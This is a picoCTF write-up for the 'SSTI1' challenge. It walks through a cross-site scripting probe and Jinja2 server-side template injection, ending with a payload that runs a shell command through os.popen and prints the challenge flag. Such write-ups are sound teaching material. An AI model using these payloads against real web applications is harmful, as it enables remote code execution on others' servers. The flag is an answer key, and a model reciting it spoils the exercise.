# SSTI1

**Link**: https://play.picoctf.org/practice/challenge/492

**Difficulty**: easy

## Description

I made a cool website where you can announce whatever you want! Try it out!
I heard templating is a cool and modular way to build web apps! Check out my website here!

## Resources

## How to solve

By sending this payload into the site:

    <script>alert(1)</script>

you can confirm the page is vulnerable to cross-site scripting. Test template evaluation with:

    {{7*7}}

which returns:

    49

This indicates a server-side template engine (Jinja2). List available classes and subclasses to find useful objects:

    {{ ''.__class__.__mro__[1].__subclasses__()[0:200]|string }}

Inspect the output to locate the `subprocess.Popen` class index (for example `356` in this instance). Use that index to invoke a shell command via the class globals and read the flag:

    {{ ''.__class__.__mro__[1].__subclasses__()[356].__init__.__globals__['os'].popen('cat flag').read() }}

The response will contain the flag:

    picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_4675f3fa}

